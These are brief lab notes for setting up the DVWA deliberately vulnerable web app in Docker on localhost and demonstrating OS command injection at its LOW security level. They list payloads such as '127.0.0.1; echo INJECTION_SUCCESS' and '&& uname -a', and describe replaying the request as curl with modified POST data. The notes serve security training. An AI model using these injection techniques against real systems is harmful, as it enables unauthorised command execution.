sudo apt update
sudo apt install -y docker.io
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
sudo docker run --rm -d --name dvwa -p 8080:80 vulnerables/web-dvwa
sudo docker ps

http://127.0.0.1:8080/
Click on Create/Reset DB
Default credentials (DVWA):
 Username: admin
 Password: password
After login: DVWA Security → set to LOW for the demo.

127.0.0.1
127.0.0.1; echo INJECTION_SUCCESS
127.0.0.1 && uname –a
127.0.0.1; ping -c 2 127.0.0.1

Open DevTools → Network.
To open DevTools- Press Ctrl + Shift + I in the same window
submit 127.0.0.1
right click->copy->curl
paste in terminal
change post data ip=127.0.0.1;echo INJECTION_SUCCESS,run

2>/dev/null |grep -C2 INJECTION_SUCCESS ||echo "marker not found"

